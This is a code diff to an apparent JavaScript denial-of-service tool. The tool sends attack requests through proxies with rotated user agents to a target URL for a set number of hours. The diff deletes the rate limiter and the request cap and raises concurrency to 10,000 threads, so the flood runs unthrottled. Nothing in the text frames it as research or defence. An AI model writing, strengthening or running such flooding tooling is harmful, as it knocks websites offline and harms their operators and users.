@@ -15,32 +15,7 @@ const proxyFilePath = path.join(__dirname, "proxy.txt");
 const ualist = path.join(__dirname, "ua.txt");
 
 // Configuration
-const maxRequests = Number.MAX_SAFE_INTEGER;
-const requestsPerSecond = 10000000;
-const numThreads = 1000;
-
-// Rate limiter state
-let requestCount = 0;
-let tokens = requestsPerSecond;
-let lastRefill = Date.now();
-
-// Rate limiter function
-const refillTokens = () => {
-    const now = Date.now();
-    const elapsedSeconds = (now - lastRefill) / 1000;
-    tokens = Math.min(requestsPerSecond, tokens + elapsedSeconds * requestsPerSecond);
-    lastRefill = now;
-};
-
-const canSendRequest = () => {
-    refillTokens();
-    if (requestCount >= maxRequests || tokens < 1) {
-        return false;
-    }
-    tokens--;
-    requestCount++;
-    return true;
-};
+const numThreads = 10000;
 
 const ensureStateFileExists = () => {
     if (!fs.existsSync(stateFilePath)) {
@@ -219,11 +194,7 @@ const createHeaders = (url) => ({
 });
 
 const randomAttack = async (url, agent, continueAttack) => {
-    if (!continueAttack || !url || !canSendRequest()) {
-        if (requestCount >= maxRequests) {
-            console.log(rainbow("Maximum request limit reached. Stopping attack."));
-            continueAttack = false;
-        }
+    if (!continueAttack || !url) {
         setTimeout(() => randomAttack(url, agent, continueAttack), 100);
         return;
     }
@@ -252,11 +223,7 @@ const randomAttack = async (url, agent, continueAttack) => {
 };
 
 const performAttack = async (url, agent, continueAttack) => {
-    if (!continueAttack || !url || !canSendRequest()) {
-        if (requestCount >= maxRequests) {
-            console.log(rainbow("Maximum request limit reached. Stopping attack."));
-            continueAttack = false;
-        }
+    if (!continueAttack || !url) {
         setTimeout(() => performAttack(url, agent, continueAttack), 100);
         return;
     }
@@ -316,11 +283,6 @@ const startAttack = (url, durationHours) => {
             console.error("No proxies found. Please add proxies to the proxy file.");
             return;
         }
-
-        // Reset rate limiter
-        requestCount = 0;
-        tokens = requestsPerSecond;
-        lastRefill = Date.now();
 
         continueAttack = true;
         targetUrl = validUrl;
